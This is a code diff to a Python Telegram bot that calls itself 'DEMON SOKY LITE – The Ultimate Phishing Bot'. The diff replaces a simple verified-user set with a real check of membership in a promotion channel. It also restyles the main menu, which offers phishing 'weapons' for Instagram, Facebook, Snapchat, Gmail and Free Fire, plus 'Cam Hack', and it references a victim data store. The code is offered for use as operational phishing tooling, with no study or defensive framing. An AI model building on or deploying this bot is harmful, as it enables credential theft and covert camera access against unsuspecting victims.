@@ -2,6 +2,7 @@ import telebot
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
 import time
 import threading
+import requests
 from bot.config import BOT_TOKEN
 from bot.buttons import (
     handle_cam_hack,
@@ -18,8 +19,22 @@ from bot.utils.storage import link_cache, victim_data_store
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# ========== STORE VERIFIED USERS ==========
-verified_users = set()  # Users who have verified joining @nrtecno2
+# ========== CHECK IF USER JOINED CHANNEL ==========
+def check_user_joined(user_id):
+    """Check if user has joined @nrtecno2"""
+    try:
+        # Get chat member status
+        chat_member = bot.get_chat_member("@nrtecno2", user_id)
+        status = chat_member.status
+        # If status is 'left' or 'kicked', user hasn't joined
+        if status in ['left', 'kicked']:
+            return False
+        # 'member', 'creator', 'administrator', 'restricted' means joined
+        return True
+    except Exception as e:
+        print(f"Check join error: {e}")
+        # If can't check, assume they haven't joined
+        return False
 
 # ========== BOTTOM BUTTONS ==========
 
@@ -53,21 +68,22 @@ def get_join_buttons():
 def start(message):
     user_id = message.chat.id
 
-    # Check if user is already verified
-    if user_id in verified_users:
+    # Check if user has joined the channel
+    if check_user_joined(user_id):
+        # User has joined → show main menu
         show_main_menu(message)
         return
-
-    # Not verified → show join & verify buttons
-    bot.send_message(
-        user_id,
-        "🔐 *Access Restricted*\n\n"
-        "You must join @nrtecno2 to use this bot.\n\n"
-        "👉 [Join @nrtecno2](https://t.me/nrtecno2)\n\n"
-        "After joining, click the button below to verify.",
-        reply_markup=get_join_buttons(),
-        parse_mode="Markdown"
-    )
+    else:
+        # User hasn't joined → show join & verify buttons
+        bot.send_message(
+            user_id,
+            "🔐 *Access Restricted*\n\n"
+            "You must join @nrtecno2 to use this bot.\n\n"
+            "👉 [Join @nrtecno2](https://t.me/nrtecno2)\n\n"
+            "After joining, click the button below to verify.",
+            reply_markup=get_join_buttons(),
+            parse_mode="Markdown"
+        )
 
 # ========== VERIFY CALLBACK ==========
 
@@ -75,16 +91,21 @@ def start(message):
 def verify_join(call):
     user_id = call.from_user.id
 
-    # Add user to verified set
-    verified_users.add(user_id)
-
-    bot.answer_callback_query(call.id, "✅ Verified! You can now use the bot.")
-    bot.send_message(
-        user_id,
-        "✅ *Welcome!*\n\nYou can now use all features.",
-        reply_markup=get_bottom_buttons(),
-        parse_mode="Markdown"
-    )
+    # Check again if user joined
+    if check_user_joined(user_id):
+        bot.answer_callback_query(call.id, "✅ Verified! You can now use the bot.")
+        bot.send_message(
+            user_id,
+            "✅ *Welcome!*\n\nYou can now use all features.",
+            reply_markup=get_bottom_buttons(),
+            parse_mode="Markdown"
+        )
+    else:
+        bot.answer_callback_query(
+            call.id, 
+            "❌ You haven't joined @nrtecno2 yet!\nPlease join first using the button above.",
+            show_alert=True
+        )
 
 # ========== MAIN MENU ==========
 
@@ -92,7 +113,15 @@ def show_main_menu(message):
     user_id = message.chat.id
     bot.send_message(
         user_id,
-        "🔥 *Choose your weapon:*\n\n"
+        "🔥 *DEMON SOKY LITE* 🔥\n"
+        "╔═══════════════════════════════╗\n"
+        "║  ⚡ The Ultimate Phishing Bot ⚡  ║\n"
+        "╚═══════════════════════════════╝\n\n"
+        "💀 *Welcome, Commander.*\n"
+        "🔐 Your journey to the dark side begins here.\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "📌 *Choose your weapon:*\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "📸 Cam Hack (working)\n"
         "📸 Instagram (working)\n"
         "📘 Facebook (working)\n"
@@ -100,7 +129,10 @@ def show_main_menu(message):
         "👻 Snapchat (working)\n"
         "📧 Gmail (working)\n"
         "🎮 Free Fire (working)\n"
-        "🔗 All Links (working)",
+        "🔗 All Links (working)\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "💬 *Use buttons below or type commands.*\n"
+        "⚠️ *Stay anonymous. Stay safe.*",
         reply_markup=get_bottom_buttons(),
         parse_mode="Markdown"
     )
@@ -112,8 +144,8 @@ def route_buttons(message):
     text = message.text
     user_id = message.chat.id
 
-    # Check if user is verified
-    if user_id not in verified_users:
+    # Check if user joined before any action
+    if not check_user_joined(user_id):
         bot.send_message(
             user_id,
             "❌ You must join @nrtecno2 first. Send /start again.",
@@ -121,7 +153,6 @@ def route_buttons(message):
         )
         return
 
-    # Route to buttons
     if text == "📸 Cam Hack":
         handle_cam_hack(bot, message, get_bottom_buttons)
     elif text == "📸 Instagram":
